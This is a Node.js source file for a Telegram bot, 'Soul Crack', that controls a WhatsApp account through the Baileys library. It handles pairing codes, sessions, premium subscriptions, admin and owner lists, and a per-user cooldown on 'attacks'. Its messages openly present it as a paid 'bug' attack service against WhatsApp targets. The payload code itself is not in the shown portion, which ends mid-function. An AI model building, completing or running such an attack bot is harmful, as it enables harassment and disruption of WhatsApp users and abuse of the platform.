const {
        Telegraf,
        Markup
} = require("telegraf");
const fs = require('fs');
const {
        default: makeWASocket,
        useMultiFileAuthState,
        downloadContentFromMessage,
        emitGroupParticipantsUpdate,
        emitGroupUpdate,
        generateWAMessageContent,
        generateWAMessage,
        makeInMemoryStore,
        prepareWAMessageMedia,
        generateWAMessageFromContent,
        MediaType,
        areJidsSameUser,
        WAMessageStatus,
        downloadAndSaveMediaMessage,
        AuthenticationState,
        GroupMetadata,
        initInMemoryKeyStore,
        getContentType,
        MiscMessageGenerationOptions,
        useSingleFileAuthState,
        BufferJSON,
        WAMessageProto,
        MessageOptions,
        WAFlag,
        WANode,
        WAMetric,
        ChatModification,
        MessageTypeProto,
        WALocationMessage,
        ReconnectMode,
        WAContextInfo,
        proto,
        WAGroupMetadata,
        ProxyAgent,
        waChatKey,
        MimetypeMap,
        MediaPathMap,
        WAContactMessage,
        WAContactsArrayMessage,
        WAGroupInviteMessage,
        WATextMessage,
        WAMessageContent,
        WAMessage,
        BaileysError,
        WA_MESSAGE_STATUS_TYPE,
        MediaConnInfo,
        URL_REGEX,
        WAUrlInfo,
        WA_DEFAULT_EPHEMERAL,
        WAMediaUpload,
        jidDecode,
        mentionedJid,
        processTime,
        Browser,
        MessageType,
        Presence,
        WA_MESSAGE_STUB_TYPES,
        Mimetype,
        relayWAMessage,
        Browsers,
        GroupSettingChange,
        DisconnectReason,
        WASocket,
        getStream,
        WAProto,
        isBaileys,
        AnyMessageContent,
        fetchLatestBaileysVersion,
        templateMessage,
        InteractiveMessage,
        Header
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const {
        BOT_TOKEN,
        allowedDevelopers
} = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 9_000_000 });
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
let bydaah = null;
let isWhatsAppConnected = false;
const usePairingCode = true; 
let maintenanceConfig = {
        maintenance_mode: false,
        message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let whatsappUserInfo = null;
let bugCooldown = 0; 
let userLastAttack = new Map(); 
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const isOwner = (userId) => {
        if (ownerList.includes(userId.toString())) {
                ownerataubukan = "✅";
                return true;
        } else {
                ownerataubukan = "❌";
                return false;
        }
};
const OWNER_ID = (userId) => {
        if (allowedDevelopers.includes(userId.toString())) {
                ysudh = "✅";
                return true;
        } else {
                gnymbung = "❌";
                return false;
        }
};
const isAdmin = (userId) => {
        if (adminList.includes(userId.toString())) {
                adminataubukan = "✅";
                return true;
        } else {
                adminataubukan = "❌";
                return false;
        }
};
const addAdmin = (userId) => {
        if (!adminList.includes(userId)) {
                adminList.push(userId);
                saveAdmins();
        }
};
const removeAdmin = (userId) => {
        adminList = adminList.filter(id => id !== userId);
        saveAdmins();
};
const saveAdmins = () => {
        fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};
const loadAdmins = () => {
        try {
                const data = fs.readFileSync('./admins.json');
                adminList = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat daftar admin:'), error);
                adminList = [];
        }
};
function checkCooldown(userId) {
        if (!userLastAttack.has(userId)) {
                return {
                        canAttack: true,
                        remainingTime: 0
                };
        }
        const lastAttack = userLastAttack.get(userId);
        const now = Date.now();
        const timePassed = (now - lastAttack) / 1000; 
        if (timePassed < bugCooldown) {
                return {
                        canAttack: false,
                        remainingTime: Math.ceil(bugCooldown - timePassed)
                };
        }
        return {
                canAttack: true,
                remainingTime: 0
        };
}
const isPremiumUser = (userId) => {
        const userData = premiumUsers[userId];
        if (!userData) {
                Premiumataubukan = "❌";
                return false;
        }
        const now = moment().tz('Asia/Jakarta');
        const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');
        if (now.isBefore(expirationDate)) {
                Premiumataubukan = "✅";
                return true;
        } else {
                Premiumataubukan = "❌";
                return false;
        }
};
const loadPremiumUsers = () => {
        try {
                if (fs.existsSync('./premiumUsers.json')) {
                        const data = fs.readFileSync('./premiumUsers.json', 'utf8');
                        premiumUsers = JSON.parse(data);
                } else {
                        premiumUsers = {};
                        savePremiumUsers();
                }
        } catch (error) {
                console.error('Error loading premium users:', error);
                premiumUsers = {};
        }
};
const savePremiumUsers = () => {
        try {
                const safeData = {};
                for (const [userId, userData] of Object.entries(premiumUsers)) {
                        safeData[userId] = {
                                expired: userData.expired
                        };
                }
                const jsonString = JSON.stringify(safeData, null, 2);
                fs.writeFileSync('./premiumUsers.json', jsonString);
        } catch (error) {
                console.error('Error saving premium users:', error);
        }
};
const addPremiumUser = (userId, durationDays) => {
        try {
                if (!userId || !durationDays) {
                        throw new Error('Invalid user ID or duration');
                }
                const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
                premiumUsers[userId] = {
                        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
                };
                savePremiumUsers();
        } catch (error) {
                console.error('Error adding premium user:', error);
                throw error;
        }
};
const loadDeviceList = () => {
        try {
                const data = fs.readFileSync('./ListDevice.json');
                deviceList = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat daftar device:'), error);
                deviceList = [];
        }
};
const saveDeviceList = () => {
        fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};
const addDeviceToList = (userId, token) => {
        const deviceNumber = deviceList.length + 1;
        deviceList.push({
                number: deviceNumber,
                userId: userId,
                token: token
        });
        saveDeviceList();
        console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};
const recordUserActivity = (userId, userNickname) => {
        const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
        userActivity[userId] = {
                nickname: userNickname,
                last_seen: now
        };
        fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};
const loadUserActivity = () => {
        try {
                const data = fs.readFileSync('./userActivity.json');
                userActivity = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
                userActivity = {};
        }
};
const checkMaintenance = async (ctx, next) => {
        let userId, userNickname;
        if (ctx.from) {
                userId = ctx.from.id.toString();
                userNickname = ctx.from.first_name || userId;
        } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
                userId = ctx.update.channel_post.sender_chat.id.toString();
                userNickname = ctx.update.channel_post.sender_chat.title || userId;
        }
        if (userId) {
                recordUserActivity(userId, userNickname);
        }
        if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
                console.log("Pesan Maintenance:", maintenanceConfig.message);
                const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); 
                return await ctx.replyWithMarkdown(escapedMessage);
        } else {
                await next();
        }
};
const checkPremium = async (ctx, next) => {
        if (isPremiumUser(ctx.from.id)) {
                await next();
        } else {
                const premiumMessage = `
  𐊖𐊒𐌵𐎘
 ╔══════════════════
 ║ ❌ ACCESS DENIED!
 ║ 💎 Status: NON-PREMIUM
 ║ ⚠️ Need Premium Access
 ╚══════════════════`;
                await ctx.reply(premiumMessage, {
                        reply_markup: {
                                inline_keyboard: [
                                        [{
                                                text: "💫 UPGRADE TO PREMIUM",
                                                url: "https://t.me/zihardev"
                                        }],
                                        [{
                                                text: "📖 PREMIUM FEATURES",
                                                callback_data: "premiuminfo"
                                        }]
                                ]
                        }
                });
        }
};
bot.action("premiuminfo", async (ctx) => {
    try {
        await ctx.answerCbQuery("^^", { show_alert: true });

        const XNXX = `
⚡ 𝗡𝗘𝗪 𝗩1 𝗥𝗘𝗟𝗘𝗔𝗦𝗘 ⚡
COBA AJA SENDIIRI :v
dev : @zihardev
Kami berharap Anda menikmati fitur baru ini! 
Jangan ragu untuk memberikan feedback atau pertanyaan.
        `;

        await ctx.reply(XNXX, {
            reply_to_message_id: ctx.update.callback_query.message.message_id
        });

    } catch (error) {
        console.error("Error showing warning:", error);
    }
});
const startSesi = async () => {
        let retryCount = 0;
        const maxRetries = 3;
        const retryDelay = 5000; 
        const attemptConnection = async () => {
                try {
                        const {
                                state,
                                saveCreds
                        } = await useMultiFileAuthState('./session');
                        const {
                                version
                        } = await fetchLatestBaileysVersion();
                        const connectionOptions = {
                                version,
                                keepAliveIntervalMs: 30000,
                                printQRInTerminal: false,
                                logger: pino({
                                        level: "silent"
                                }),
                                auth: state,
                                browser: ['Mac OS', 'Safari', '10.15.7'],
                                getMessage: async (key) => ({
                                        conversation: 'P',
                                }),
                                connectTimeoutMs: 60000,
                                qrTimeout: 30000,
                        };
                        bydaah = makeWASocket(connectionOptions);
                        bydaah.ev.on('creds.update', saveCreds);
                        store.bind(bydaah.ev);
                        bydaah.ev.on('connection.update', async (update) => {
                                const {
                                        connection,
                                        lastDisconnect
                                } = update;
                                if (connection === 'open') {
                                        isWhatsAppConnected = true;
                                        whatsappUserInfo = {
                                                name: bydaah?.user?.name,
                                                id: bydaah?.user?.id
                                        };
                                        retryCount = 0; 
                                        const successMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Connected ✅
│ • Name: ${bydaah?.user?.name || 'Unknown'}
│ • Number: ${bydaah?.user?.id?.split(':')[0] || 'Unknown'}
│
├─────『 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 』
│ • Mode: Active
│ • Version: 1
│ • Type: Multi-Device
│
╰═════════════════════⊱`;
                                        try {
                                                for (const ownerId of allowedDevelopers) {
                                                        await bot.telegram.sendMessage(ownerId, successMessage);
                                                }
                                                for (const adminId of adminList) {
                                                        if (!allowedDevelopers.includes(adminId)) {
                                                                await bot.telegram.sendMessage(adminId, successMessage);
                                                        }
                                                }
                                        } catch (error) {
                                                console.error('Error sending connect notification:', error);
                                        }
                                        console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
                                }
                                if (connection === 'close') {
                                        isWhatsAppConnected = false;
                                        whatsappUserInfo = null;
                                        const statusCode = lastDisconnect?.error?.output?.statusCode;
                                        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                                        const isBanned = statusCode === 401 ||
                                                lastDisconnect?.error?.message?.includes('banned') ||
                                                lastDisconnect?.error?.message?.includes('Block');
                                        if (isBanned) {
                                                const bannedMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐚𝐧𝐧𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Status: Account Banned ⛔
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto deleting session
│ • Create new WhatsApp number
│
╰═════════════════════⊱`;
                                                try {
                                                        for (const ownerId of allowedDevelopers) {
                                                                await bot.telegram.sendMessage(ownerId, bannedMessage);
                                                        }
                                                        const sessionPath = './session';
                                                        if (fs.existsSync(sessionPath)) {
                                                                fs.rmSync(sessionPath, {
                                                                        recursive: true,
                                                                        force: true
                                                                });
                                                                const deleteMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session cleared ✅
│ • Ready for new pairing
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing with new number
│
╰═════════════════════⊱`;
                                                                for (const ownerId of allowedDevelopers) {
                                                                        await bot.telegram.sendMessage(ownerId, deleteMessage);
                                                                }
                                                        }
                                                        return; 
                                                } catch (error) {
                                                        console.error('Error handling ban:', error);
                                                }
                                        }
                                        if (retryCount < maxRetries && shouldReconnect) {
                                                retryCount++;
                                                const disconnectMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐋𝐨𝐬𝐭 』
│ • Status: Disconnected ❌
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Attempt: ${retryCount}/${maxRetries}
│ • Auto Reconnect: Yes
│
╰═════════════════════⊱`;
                                                try {
                                                        for (const ownerId of allowedDevelopers) {
                                                                await bot.telegram.sendMessage(ownerId, disconnectMessage);
                                                        }
                                                } catch (error) {
                                                        console.error('Error sending disconnect notification:', error);
                                                }
                                                console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
                                                await new Promise(resolve => setTimeout(resolve, retryDelay));
                                                return attemptConnection();
                                        }
                                        if (retryCount >= maxRetries) {
                                                const maxRetriesMessage = `
╭═══════『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Max retries reached ❌
│ • Failed to connect ${maxRetries}x
│ • Possible account issue
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto clearing session...
│
╰═════════════════════⊱`;
                                                try {
                                                        for (const ownerId of allowedDevelopers) {
                                                                await bot.telegram.sendMessage(ownerId, maxRetriesMessage);
                                                        }
                                                        const sessionPath = './session';
                                                        if (fs.existsSync(sessionPath)) {
                                                                fs.rmSync(sessionPath, {
                                                                        recursive: true,
                                                                        force: true
                                                                });
                                                                const clearMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session deleted ✅
│ • System ready for new setup
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new number
│
╰═════════════════════⊱`;
                                                                for (const ownerId of allowedDevelopers) {
                                                                        await bot.telegram.sendMessage(ownerId, clearMessage);
                                                                }
                                                        }
                                                } catch (error) {
                                                        console.error('Error handling max retries:', error);
                                                }
                                        }
                                }
                        });
                } catch (error) {
                        console.error('Connection error:', error);
                        if (retryCount < maxRetries) {
                                retryCount++;
                                console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
                                await new Promise(resolve => setTimeout(resolve, retryDelay));
                                return attemptConnection();
                        }
                }
        };
        return attemptConnection();
};
(async () => {
        console.log(chalk.whiteBright.bold(`
╭──────────────────────────────────────────────╮
│                                              │
│     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     │
│     ████████████████████████████████████     │    
│     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
│                                              │
│        Welcome to Soul Crack         │
│     @zihardev    │
│                                              │
╰──────────────────────────────────────────────╯
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        SUKSES MEMUAT DATABASE OWNER          ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
        loadPremiumUsers();
        loadAdmins();
        loadDeviceList();
        loadUserActivity();
        startSesi();
        addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
bot.command("removeallbot", async (ctx) => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                await ctx.telegram.sendSticker(ctx.chat.id, 'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        try {
                const confirmationMessage = `
╭═══════『 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐟𝐢??𝐦𝐚𝐭𝐢𝐨𝐧 』
│ • Action: Remove All Bot Sessions
│ • Impact: All WhatsApp connections will be lost
│ • Status: Awaiting Confirmation
│
├─────『 ??𝐨𝐭𝐞 』
│ • This action cannot be undone
│ • You'll need to pair again after this
│
╰═════════════════════⊱`;
                await ctx.reply(confirmationMessage, {
                        reply_markup: {
                                inline_keyboard: [
                                        [{
                                                        text: "✅ Yes, Remove All",
                                                        callback_data: "confirm_remove"
                                                },
                                                {
                                                        text: "❌ Cancel",
                                                        callback_data: "cancel_remove"
                                                }
                                        ]
                                ]
                        }
                });
        } catch (error) {
                console.error('Remove Bot Error:', error);
                await ctx.reply("❌ Terjadi kesalahan saat mencoba menghapus session.");
        }
});
bot.action('confirm_remove', async (ctx) => {
        try {
                await ctx.deleteMessage();
                if (bydaah && isWhatsAppConnected) {
                        await bydaah.logout();
                        isWhatsAppConnected = false;
                        whatsappUserInfo = null;
                }
                const sessionPath = './session';
                if (fs.existsSync(sessionPath)) {
                        fs.rmSync(sessionPath, {
                                recursive: true,
                                force: true
                        });
                }
                const successMessage = `
╭═══════『 ✅ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Action: Remove All Bot Sessions
│ • Status: Completed Successfully
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new bot
│
╰═════════════════════⊱`;
                await ctx.reply(successMessage);
        } catch (error) {
                console.error('Remove Session Error:', error);
                await ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
        }
});
bot.action('cancel_remove', async (ctx) => {
        await ctx.deleteMessage();
        await ctx.reply("⚠️ Penghapusan session dibatalkan.");
});
bot.command("addpairing", async (ctx) => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                await ctx.telegram.sendSticker(ctx.chat.id, 'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        function formatPhoneNumber(number) {
                let cleaned = number.replace(/[^0-9]/g, '');
                cleaned = cleaned.replace(/^\+/, '');
                if (cleaned.startsWith('0')) {
                        return '62' + cleaned.slice(1);
                } else if (cleaned.startsWith('62')) {
                        return cleaned;
                } else {
                        return cleaned;
                }
        }
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) {
                const helpMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐅𝐨??𝐦𝐚𝐭 』
│ • /addpairing 628xxxxxxxxxx
│ • /addpairing +1234567890    
│ • /addpairing 0812xxxxx
│
├─────『 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐝 』
│ • Indonesian numbers (62/0)
│ • International numbers
│ • With/without country code
│
╰═════════════════════⊱`;
                return await ctx.reply(helpMessage);
        }
        let phoneNumber = args.slice(1).join('');
        phoneNumber = formatPhoneNumber(phoneNumber);
        try {
                if (!bydaah || !isWhatsAppConnected) {
                        await ctx.reply("⏳ Menginisialisasi koneksi WhatsApp...");
                        await startSesi();
                        await new Promise(resolve => setTimeout(resolve, 3000));
                }
                await ctx.reply("⏳ Memproses permintaan pairing...");
                let pairingCode;
                let retryCount = 0;
                const maxRetries = 3;
                while (retryCount < maxRetries && !pairingCode) {
                        try {
                                pairingCode = await bydaah.requestPairingCode(phoneNumber);
                                if (!pairingCode || pairingCode.length < 4) {
                                        throw new Error('Invalid pairing code received');
                                }
                        } catch (error) {
                                retryCount++;
                                if (retryCount === maxRetries) throw error;
                                await new Promise(resolve => setTimeout(resolve, 2000));
                        }
                }
                const initialMsg = await ctx.reply(`
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Generated ✅
│ • Expires in: 30 seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`);
                let timeLeft = 60;
                const countdownInterval = setInterval(async () => {
                        timeLeft--;
                        if (timeLeft <= 0) {
                                clearInterval(countdownInterval);
                                try {
                                        await ctx.telegram.editMessageText(
                                                ctx.chat.id,
                                                initialMsg.message_id,
                                                null,
                                                `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: EXPIRED ⌛
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Code has expired
│ • Please request new code
│
╰═════════════════════⊱`
                                        );
                                } catch (error) {
                                        console.error("Error updating expired message:", error);
                                }
                                return;
                        }
                        try {
                                await ctx.telegram.editMessageText(
                                        ctx.chat.id,
                                        initialMsg.message_id,
                                        null,
                                        `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Active ✅
│ • Expires in: ${timeLeft} seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`
                                );
                        } catch (error) {
                                console.error("Error updating countdown:", error);
                        }
                }, 1000);
        } catch (error) {
                console.error('Pairing Error:', error);
                const errorMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ • Error: Failed to generate code
│ • Number: ${phoneNumber}
│
├─────『 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧𝐬 』
│ • Check if number is registered
│ • Check internet connection
│ • Try again later
│
╰═════════════════════⊱`;
                await ctx.reply(errorMessage);
                if (!isWhatsAppConnected) {
                        startSesi();
                }
        }
});
bot.command("cekjeda", async (ctx) => {
        const userId = ctx.from.id;
        const isPremium = isPremiumUser(ctx.from.id);
        if (!isPremium) {
                return await ctx.reply(`
  ╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Not Premium ❌
  │ • Upgrade ke premium untuk
  │   menggunakan fitur ini
  │
  ╰═════════════════════⊱`);
        }
        const cooldownStatus = checkCooldown(userId);
        if (cooldownStatus.canAttack) {
                await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Ready ✅
  │ • Cooldown: ${bugCooldown}s
  │ • You can attack now!
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Gunakan bug menu untuk
  │   memulai serangan
  │
  ╰═════════════════════⊱`);
        } else {
                await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Sisa: ${cooldownStatus.remainingTime}s
  │ • Total: ${bugCooldown}s
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Tunggu cooldown selesai
  │   untuk menyerang lagi
  │
  ╰═════════════════════⊱`);
        }
});
bot.command("setjeda", async (ctx) => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                await ctx.telegram.sendSticker(ctx.chat.id, 'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2 || isNaN(args[1])) {
                return await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐅𝐨𝐫𝐦𝐚𝐭 』
│ • /setjeda <detik>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /setjeda 100
│ • /setjeda 300
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Minimal: 10 detik
│ • Maksimal: 3600 detik
│
╰═════════════════════⊱`);
        }
        const newCooldown = parseInt(args[1]);
        if (newCooldown < 10 || newCooldown > 3600) {
                return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
        }
        bugCooldown = newCooldown;
        await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Aktif untuk semua bug menu
│ • Berlaku per-user
│
╰═════════════════════⊱`);
});
bot.command("addowner", async (ctx) => {
        if (!OWNER_ID(ctx.from.id)) {
                return;
        }
        const userId = ctx.message.text.split(" ")[1];
        if (!userId) {
                return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
        }
        if (ownerList.includes(userId)) {
                return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
        }
        ownerList.push(userId);
        await saveOwnerList();
        const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.
*Detail:*
- *ID User:* ${userId}
Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;
        await ctx.replyWithMarkdown(successMessage);
});
bot.command("delowner", async (ctx) => {
        if (!OWNER_ID(ctx.from.id)) {
                return;
        }
        const userId = ctx.message.text.split(" ")[1];
        if (!userId) {
                return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
        }
        if (!ownerList.includes(userId)) {
                return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
        }
        ownerList = ownerList.filter(id => id !== userId);
        await saveOwnerList();
        const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.
*Detail:*
- *ID User:* ${userId}
Owner tersebut tidak lagi memiliki akses seperti owner.
    `;
        await ctx.replyWithMarkdown(successMessage);
});
bot.command("addadmin", async (ctx) => {
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                return;
        }
        let userId;
        const args = ctx.message.text.split(" ");
        if (ctx.message.reply_to_message) {
                userId = ctx.message.reply_to_message.from.id.toString();
        } else {
                if (args.length < 2) {
                        return await ctx.reply(`
 ╭═══════『 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
 │
 ├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
 │ • Reply pesan user + ketik /addadmin
 │ • /addadmin <id_user>
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ • Reply pesan + /addadmin
 │ • /addadmin 123456789
 │
 ╰═════════════════════⊱`);
                }
                userId = args[1];
        }
        if (adminList.includes(userId)) {
                return await ctx.reply(`
 ╭═══════『 𝐆𝐚𝐠𝐚𝐥 』═══════⊱
 │
 ├─────『 𝐈𝐧𝐟𝐨 』
 │ • User sudah menjadi admin
 │ • ID: ${userId}
 │
 ╰═════════════════════⊱`);
        }
        try {
                addAdmin(userId);
                let userInfo = "";
                if (ctx.message.reply_to_message) {
                        const username = ctx.message.reply_to_message.from.username;
                        const firstName = ctx.message.reply_to_message.from.first_name;
